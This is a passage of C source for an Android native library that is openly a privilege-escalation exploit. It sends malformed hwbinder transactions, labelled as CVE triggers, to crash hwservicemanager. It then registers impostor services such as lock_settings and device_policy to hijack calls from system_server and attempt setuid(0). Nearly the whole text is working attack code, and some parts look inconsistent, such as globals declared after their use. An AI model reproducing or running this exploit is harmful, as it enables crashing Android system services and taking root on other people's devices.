    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open failed");
        return -1;
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 0xFFFFFFFF;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    close(hwbinder_fd);
    if (ret < 0) {
        LOGI("Huge data transaction sent (expected error)");
        return 0;
    }
    LOGI("Huge data transaction succeeded unexpectedly");
    return 0;
}

static int trigger_cve_2020_0041(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed");
        return -1;
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4096;
    tx.tdata.offsets_size = 0xFFFFFFFF;
    tx.tdata.data.ptr.buffer = 0;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    close(hwbinder_fd);
    if (ret < 0) {
        LOGI("CVE-2020-0041 triggered (expected error)");
        return 0;
    }
    LOGI("CVE-2020-0041: ioctl succeeded unexpectedly");
    return 0;
}

static int trigger_cve_2020_0273(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed");
        return -1;
    }

    struct binder_node_info_for_ref info;
    memset(&info, 0, sizeof(info));
    info.handle = 0xFFFFFFFF;

    int ret = ioctl(hwbinder_fd, BINDER_GET_NODE_INFO_FOR_REF, &info);
    close(hwbinder_fd);
    if (ret == 0) {
        LOGI("CVE-2020-0273: info leaked? strong=%u weak=%u", info.strong_count, info.weak_count);
        return 0;
    }
    LOGI("CVE-2020-0273: ioctl failed (expected): %s", strerror(errno));
    return 0;
}

static int crash_set_max_threads(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open failed");
        return -1;
    }
    uint32_t max_threads = 0xFFFFFFFF;
    int ret = ioctl(hwbinder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    close(hwbinder_fd);
    LOGI("BINDER_SET_MAX_THREADS ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
    return (ret == 0) ? 0 : -1;
}

static int crash_set_context_mgr(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open failed");
        return -1;
    }
    int ret = ioctl(hwbinder_fd, BINDER_SET_CONTEXT_MGR, 0);
    close(hwbinder_fd);
    LOGI("BINDER_SET_CONTEXT_MGR ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
    return (ret == 0) ? 0 : -1;
}

// ==================== CVE-2019-2023 (ACL bypass) ====================
static int exploit_cve_2019_2023(const char *service_name) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;

    LOGI("[CVE-2019-2023] registering '%s'...", service_name);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed: %s", strerror(errno));
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        LOGE("malloc failed");
        close(hwbinder_fd);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2; // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0; // 読み取りなし（ブロック防止）
    bwr.read_buffer = 0;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        LOGE("ioctl ADD_SERVICE failed: %s", strerror(errno));
        close(hwbinder_fd);
        return -1;
    }
    LOGI("ADD_SERVICE succeeded!");

    // GET_SERVICEでハンドル取得
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1; // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        LOGE("ioctl GET_SERVICE failed: %s", strerror(errno));
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        LOGE("No handle returned");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    LOGI("Service handle: %d", handle);
    close(hwbinder_fd);
    return handle;
}

// ==================== Binder サーバーループ（変更なし） ====================
static int binder_server_loop(int binder_fd, int expected_handle) {
    uint8_t read_buf[4096];
    struct binder_write_read bwr;
    int ret;
    int transaction_count = 0;

    LOGI("Starting Binder server loop for handle %d...", expected_handle);
    LOGI("Waiting for transactions...");

    while (1) {
        memset(&bwr, 0, sizeof(bwr));
        bwr.read_size = sizeof(read_buf);
        bwr.read_buffer = (binder_uintptr_t)read_buf;

        ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        if (ret < 0) {
            LOGE("ioctl read failed: %s", strerror(errno));
            break;
        }
        if (bwr.read_consumed == 0) {
            usleep(100000);
            continue;
        }

        uint32_t *cmd = (uint32_t*)read_buf;
        uint32_t cmd_code = *cmd;
        uint8_t *payload = read_buf + sizeof(uint32_t);
        size_t payload_size = bwr.read_consumed - sizeof(uint32_t);

        if (cmd_code == BR_NOOP) {
            continue;
        }

        LOGD("Received cmd=0x%x, size=%zu", cmd_code, payload_size);

        if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
            struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
            if (t->sender_euid == 1000) {
                LOGI("***** system_server CALLED OUR SERVICE! (uid=1000) *****");
                pid_t pid = fork();
                if (pid == 0) {
                    setuid(0);
                    setresuid(0,0,0);
                    FILE *fp = fopen(g_output_path, "a");
                    if (fp) {
                        fprintf(fp, "=== Exploit Success ===\n");
                        fprintf(fp, "UID after setuid: %d\n", getuid());
                        fprintf(fp, "EUID after setresuid: %d\n", geteuid());
                        fclose(fp);
                    }
                    _exit(0);
                } else if (pid > 0) {
                    wait(NULL);
                    LOGI("Privilege escalation attempted. Check %s", g_output_path);
                }
                g_exploit_success = 1;
            } else {
                LOGI("Sender uid=%d (ignoring)", t->sender_euid);
            }

            // 応答を返す
            struct {
                uint32_t cmd;
                uint32_t status;
            } __attribute__((packed)) reply;
            reply.cmd = BR_OK;
            reply.status = 0;

            struct binder_write_read write_bwr;
            memset(&write_bwr, 0, sizeof(write_bwr));
            write_bwr.write_size = sizeof(reply);
            write_bwr.write_buffer = (binder_uintptr_t)&reply;

            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);

            uint32_t complete_cmd = BR_TRANSACTION_COMPLETE;
            write_bwr.write_size = sizeof(complete_cmd);
            write_bwr.write_buffer = (binder_uintptr_t)&complete_cmd;
            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);

            transaction_count++;
            LOGI("Transaction #%d handled.", transaction_count);
        } else if (cmd_code == BR_DEAD_BINDER) {
            LOGI("Received DEAD_BINDER");
            break;
        } else {
            LOGD("Unhandled cmd=0x%x", cmd_code);
        }
    }
    return transaction_count;
}

// ==================== サービス登録＋サーバー起動（変更なし） ====================
static void register_and_serve(const char *service_name) {
    int handle = exploit_cve_2019_2023(service_name);
    if (handle < 0) {
        LOGE("Failed to register '%s'", service_name);
        return;
    }
    LOGI("Registered '%s' (handle %d)", service_name, handle);

    int binder_fd = open("/dev/hwbinder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("open /dev/hwbinder for server failed: %s", strerror(errno));
        return;
    }

    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    bwr.read_size = 0;
    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
        LOGE("BC_ENTER_LOOPER failed: %s", strerror(errno));
        close(binder_fd);
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        binder_server_loop(binder_fd, handle);
        _exit(0);
    } else if (pid > 0) {
        LOGI("Binder server for '%s' running (PID %d)", service_name, pid);
        close(binder_fd);
    } else {
        LOGE("fork server failed: %s", strerror(errno));
        close(binder_fd);
    }
}

// ==================== グローバル変数（既存） ====================
static volatile int g_exploit_success = 0;
static char g_output_path[256] = "/data/local/tmp/cve_result.txt";
static char g_log_path[256] = "/data/local/tmp/binder_traffic.log";

// ==================== JNI エクスポート関数 ====================
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeGetHwServicemanagerPid(JNIEnv* env, jclass clazz) {
    return get_hwservicemanager_pid();
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
                                                   jstring joutput_path,
                                                   jstring jlog_path) {
    const char *output_path = (*env)->GetStringUTFChars(env, joutput_path, NULL);
    const char *log_path = (*env)->GetStringUTFChars(env, jlog_path, NULL);
    if (output_path) {
        strncpy(g_output_path, output_path, sizeof(g_output_path) - 1);
        (*env)->ReleaseStringUTFChars(env, joutput_path, output_path);
    }
    if (log_path) {
        strncpy(g_log_path, log_path, sizeof(g_log_path) - 1);
        (*env)->ReleaseStringUTFChars(env, jlog_path, log_path);
    }

    LOGI("========================================");
    LOGI("CVE-2019-2023 Ultimate Exploit - Enhanced Multi-Vector Crash & Hijack");
    LOGI("========================================");

    FILE *fp = fopen(g_log_path, "w");
    if (fp) {
        fprintf(fp, "=== Binder Traffic Log ===\n");
        fclose(fp);
    }

    g_hwservicemanager_pid = get_hwservicemanager_pid();
    if (g_hwservicemanager_pid <= 0) {
        LOGI("Could not find hwservicemanager. Continuing anyway...");
    } else {
        LOGI("Current hwservicemanager PID: %d", g_hwservicemanager_pid);
    }

    LOGI("Phase 1: Crash hwservicemanager with enhanced multiple vectors");
    int crashed = 0;
    for (int i = 0; i < 5 && !crashed; i++) {
        if (crash_hwservicemanager() == 0) {
            crashed = 1;
        }
        sleep(2);
    }
    if (!crashed) {
        LOGI("Failed to crash hwservicemanager. Continuing anyway...");
    }

    LOGI("Phase 2: Wait for hwservicemanager restart");
    int max_wait = 30;
    while (max_wait-- > 0) {
        pid_t new_pid = get_hwservicemanager_pid();
        if (new_pid > 0 && new_pid != g_hwservicemanager_pid) {
            LOGI("hwservicemanager restarted with PID: %d", new_pid);
            g_hwservicemanager_pid = new_pid;
            break;
        }
        sleep(1);
    }

    LOGI("Phase 3: Register all services and start servers");
    const char *target_services[] = {
        "vendor.qti.hardware.servicetracker@1.0::IServicetracker/default",
        "android.hardware.power@1.0::IPower/default",
        "android.hardware.power.IPower",
        "persistent_data_block",
        "device_policy",
        "lock_settings",
        NULL
    };
    for (int i = 0; target_services[i] != NULL; i++) {
        register_and_serve(target_services[i]);
        usleep(300000);
    }

    LOGI("Phase 4: Waiting for system_server to call...");
    LOGI("Running for 180 seconds. Check %s for logs.", g_log_path);

    for (int i = 0; i < 180; i++) {
        sleep(1);
        if (g_exploit_success) break;
    }

    if (g_exploit_success) {
        LOGI("Exploit succeeded! Check %s", g_output_path);
        FILE *fp2 = fopen(g_output_path, "a");
        if (fp2) {
            fprintf(fp2, "Exploit succeeded: system_server called our service.\n");
            fclose(fp2);
        }
        return 1;
    } else {
        LOGI("No transaction from system_server received.");
        LOGI("Try manually triggering system events (screen on/off, USB plug, etc.)");
        if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
            LOGI("setuid(0) succeeded!");
            FILE *fp2 = fopen(g_output_path, "a");
            if (fp2) {
                fprintf(fp2, "Fallback setuid(0) succeeded.\n");
                fclose(fp2);
            }
            return 1;
        } else {
            LOGI("Fallback setuid failed.");
            return 0;
        }
    }
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeAddServiceOnly(JNIEnv* env, jclass clazz, jstring jname) {
    const char *name = (*env)->GetStringUTFChars(env, jname, NULL);
    if (!name) return -1;
    int handle = exploit_cve_2019_2023(name);
    (*env)->ReleaseStringUTFChars(env, jname, name);
    return handle;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeStartServer(JNIEnv* env, jclass clazz, jint handle) {
    int binder_fd = open("/dev/hwbinder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("open /dev/hwbinder failed: %s", strerror(errno));
        return -1;
    }

    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    bwr.read_size = 0;
    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
        LOGE("BC_ENTER_LOOPER failed: %s", strerror(errno));
        close(binder_fd);
        return -1;
    }

    pid_t pid = fork();
    if (pid == 0) {
        binder_server_loop(binder_fd, handle);
        _exit(0);
    } else if (pid > 0) {
        LOGI("Binder server started (PID %d)", pid);
        close(binder_fd);
        return pid;
    } else {
        LOGE("fork failed: %s", strerror(errno));
        close(binder_fd);
        return -1;
    }
}
